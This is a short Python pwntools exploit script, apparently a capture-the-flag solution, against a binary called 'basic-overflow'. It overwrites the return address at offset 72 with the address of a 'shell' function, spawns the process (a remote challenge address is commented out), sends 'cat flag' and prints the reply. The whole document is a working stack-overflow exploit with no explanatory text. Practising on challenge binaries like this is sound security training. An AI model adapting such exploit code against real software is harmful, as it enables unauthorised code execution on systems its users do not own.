from pwn import *

exe = context.binary = ELF('basic-overflow')

winaddr = exe.symbols['shell']

payload = fit({
    72: winaddr,
})

io = exe.process() #remote('34.123.15.202', 5000)
#gdb.attach(io)
io.sendline(payload)
io.sendline('cat flag')
print(io.recvline())
print(io.recvline())